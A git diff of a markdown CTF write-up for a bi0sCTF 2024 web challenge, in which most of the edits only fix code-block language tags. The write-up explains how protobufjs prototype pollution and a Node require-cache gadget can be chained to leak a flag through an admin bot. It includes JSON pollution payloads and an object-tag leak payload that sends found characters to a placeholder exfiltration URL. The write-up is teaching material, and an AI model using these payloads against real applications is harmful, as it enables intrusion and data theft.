@@ -28,7 +28,7 @@ Download files from: [link](https://github.com/teambi0s/bi0sCTF/tree/main/2024/W
 ## Analysis
 
 Lets take a quick look at all the routes that are available to us:
-```
+```html
 /delete -  Runs cleanserver() function which deletes require.cache.
 /search/:noteId - Searches for given noteId. This endpoint uses restrictToLocalhost middleware which restricts access to localhost.
 /customise - To edit the protobuf configuration file. User input is directly written to settings.proto file.
@@ -39,7 +39,7 @@ Lets take a quick look at all the routes that are available to us:
 ```
 
 The healthcheck note and flag note are generated when the application starts.
-```javascript=
+```javascript
 ...
 let flag = process.env.FLAG;
 if(!flag){
@@ -57,7 +57,7 @@ fs.writeFileSync(`./notes/${healthCheckId}.json`, '{"title":"Healthcheck","conte
 ```
 
 The flag is in a file within notes directory with a random id as the name.
-```javascript=
+```javascript
 function generateNoteId(length) {
   const characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
   let result = '';
@@ -71,7 +71,7 @@ function generateNoteId(length) {
 ```
 
 Apart from an index.js, there is also a bot.js which contains code for the admin bot. It sets Javascript execution off and only visits the Healthcheck note.
-```javascript=
+```javascript
 ...
 const page = await browser.newPage();
 await page.setJavaScriptEnabled(false)
@@ -85,7 +85,7 @@ Problem number 2 is that javascript execution is disabled.
 <br>
 
 Lets tackle problem number 2 first. Looking closer at the /search endpoint, we can discover a leak oracle.
-```javascript=
+```javascript
 app.get('/search/:noteId', (req, res) => {
   const noteId = req.params.noteId;
   const notes=glob.sync(`./notes/${noteId}*`);
@@ -108,7 +108,7 @@ The `/search/` endpoint uses the glob module with `./notes/${noteId}*` which can
 
 We'll take a look at how to exploit this later on but there is one more condition(middleware) set on the /search endpoint that we need to keep in mind.
 
-```javascript=
+```javascript
 const restrictToLocalhost = (req, res, next) => {
   const remoteAddress = req.connection.remoteAddress;
   if (remoteAddress === '::1' || remoteAddress === '127.0.0.1' || remoteAddress === '::ffff:127.0.0.1') {
@@ -130,7 +130,7 @@ Hence we need to find a way to make use of the admin bot to utilize the oracle i
 
 The challenge uses protobufjs 7.2.3 which has a prototype pollution CVE [https://www.code-intelligence.com/blog/cve-protobufjs-prototype-pollution-cve-2023-36665](https://www.code-intelligence.com/blog/cve-protobufjs-prototype-pollution-cve-2023-36665) 
 Calling protobuf.parse() with attacker controlled schema is possible due to the file write to settings.proto in the `/customise` endpoint
-```javascript=
+```javascript
 const { data } = req.body;
 
     let author = data.pop()['author'];
@@ -156,7 +156,7 @@ The endpoint takes author and title in an array called data and writes whatever 
 
 
 At `/create`, protobuf.parse() is called. which ends up polluting the prototype.
-```javascript=
+```javascript
 app.post('/create', (req, res) => {
   requestBody=req.body
   try{
@@ -171,7 +171,7 @@ app.post('/create', (req, res) => {
 Now that we have prototype pollution, we can make use of that to pollute some properties that will load an attacker note instead of Healthcheck note when admin bot visits.
 
 One such gadget can be seen in  nodejs require function. [https://github.com/nodejs/node/blob/v20.2.0/lib/internal/modules/cjs/loader.js#L529](https://github.com/nodejs/node/blob/v20.2.0/lib/internal/modules/cjs/loader.js#L529) which lets us use `__proto__.path`, `__proto__.data.name` and `__proto__.data.exports` to load a "malicious" module/file specified in exports whenever require('name') is called.
-```javascript=
+```javascript
 ...
 function trySelf(parentPath, request) {
   if (!parentPath) return false;
@@ -205,7 +205,7 @@ Combining all the above parts, we can formulate a plan that involves the followi
 + Attacker note contains payload which leaks flag id using `/search` endpoint.
 
 Let's take a closer look at how we can achieve this.
-```jsonld
+```json
 {"data":[{"title":"option(a).constructor.prototype.data={};optional"},{"author":"optional"}]}
 {"data":[{"title":"option(a).constructor.prototype.data.name=\"./notes/Healthcheck\";optional"},{"author":"optional"}]}
 {"data":[{"title":"option(a).constructor.prototype.data.exports=\"./notes/di1k8m47ob.json\";optional"},{"author":"optional"}]}
@@ -213,7 +213,7 @@ Let's take a closer look at how we can achieve this.
 Sending the above payloads to /customise endpoint and then `/create` to create a note will pollute the required fields which will set `/notes/di1k8m47ob.json` as the module to be loaded whenever `/notes/Healthcheck` is "require"d. ie. sending request to /view/Healthcheck after doing the pollution should result in di1k8m47ob.json being rendered.
 Here is where we will face another road-block.
 
-```javascript=
+```javascript
 app.get('/view/:noteId', (req, res) => {
   const noteId = req.params.noteId;
 
@@ -245,7 +245,7 @@ This check can be bypassed but before that lets have a quick rundown of how `req
 [https://github.com/nodejs/node/blob/beb0520af74ed20c3d48a1b4f6ca8a89664976c6/lib/internal/modules/cjs/loader.js#L1023](https://github.com/nodejs/node/blob/beb0520af74ed20c3d48a1b4f6ca8a89664976c6/lib/internal/modules/cjs/loader.js#L1023)
 The three functions involved here are `Module._load`, `Module._resolveFilename` and `module._findPath()`. 
 When a file is require()’d for the first time, it does not exists in any cache. `Module._load` calls `Module._resolveFilename` and finally ends up in `module._findPath()` 
-Module._findPath() is the function which finds valid file path. [Valid extensions](https://github.com/nodejs/node/blob/beb0520af74ed20c3d48a1b4f6ca8a89664976c6/lib/internal/modules/cjs/loader.js#L582) are .js, .json and .node.
+Module.\_findPath() is the function which finds valid file path. [Valid extensions](https://github.com/nodejs/node/blob/beb0520af74ed20c3d48a1b4f6ca8a89664976c6/lib/internal/modules/cjs/loader.js#L582) are .js, .json and .node.
 After getting valid file name, the following code is run.
 
 ```jsx
@@ -256,7 +256,7 @@ if (filename) {
 ```
 
 This returns  filename and adds it to `_pathCache`. 
-At Module._load, it is checked if cache[filename] is in require.cache. If not, after module is loaded, `require.cache[filename]=module` is added and relativeResolveCache[relResolveCacheIdentifier]=filename. is also set.
+At Module.\_load, it is checked if cache[filename] is in require.cache. If not, after module is loaded, `require.cache[filename]=module` is added and relativeResolveCache[relResolveCacheIdentifier]=filename. is also set.
 
 ```jsx
 Module._cache[filename] = module;
@@ -284,13 +284,13 @@ A more detailed look at the working can be found in the link below
 ---
 
 Now, back to the road-block and how to get around it.
-When we use prototype pollution to "remap" lets say, note `abc` to `xyz`, At `Module._load`, relResolveCacheIdentifier is generated with `abc`. `Module._resolveFilename` and `Module._findPath` are called and _pathCache entry would look like `./notes/abc=<path>xyz.json`.
+When we use prototype pollution to "remap" lets say, note `abc` to `xyz`, At `Module._load`, relResolveCacheIdentifier is generated with `abc`. `Module._resolveFilename` and `Module._findPath` are called and \_pathCache entry would look like `./notes/abc=<path>xyz.json`.
 `filename` returned to `Module._load` is that of `xyz` and that is xyz is loaded into `Module._cache[<xyz filepath>]`. `relativeResolveCache[relResolveCacheIdentifier of abc]` is set to `<xyz filepath>`.
 
 If `_pathCache` key and value do not match, the entry is deleted from `_pathCache`.
 
 If the attack is tried on Healthcheck noteId, the cleanserver() function also gets executed
-```javascript=
+```javascript
 const cleanserver = () => {
   Object.keys(require.cache).forEach(i => {
     delete require.cache[i];
@@ -322,7 +322,7 @@ _This is where I might have overly complicated stuff_
 The note id is 16 characters in length. We can leak id character by character by using `payload=payload+f"<object data='http://127.0.0.1:3000/search/{i}'><object data='<exfil_url>/found/{i}'></object></object>"` and replacing `{i}` with the found id. In order to leak all characters, we can create multiple notes with one or two characters leak each. But here is where another problem occurs. If we want to pollute Healthcheck to a new note with the prototype won't be overwritten if we do the pollution again, it will create an array with both old and new polluted values. ie. data.name will become \['/note/first','/notes/second'\]
 
 To get around this, we can pollute `data` once more, make it an array, then send an empty json `{}` to `/customise` 
-```javascript=
+```javascript
 app.post('/customise',(req, res) => {
   try {
     const { data } = req.body;
@@ -335,7 +335,7 @@ app.post('/customise',(req, res) => {
 data.pop() is called and the data array is cleared. Now polluting data.name and data.exports will take effect.
 
 The following script combines all these actions to leak the flag character by character:
-```python=
+```python
 import requests
 from flask import Flask
 import string
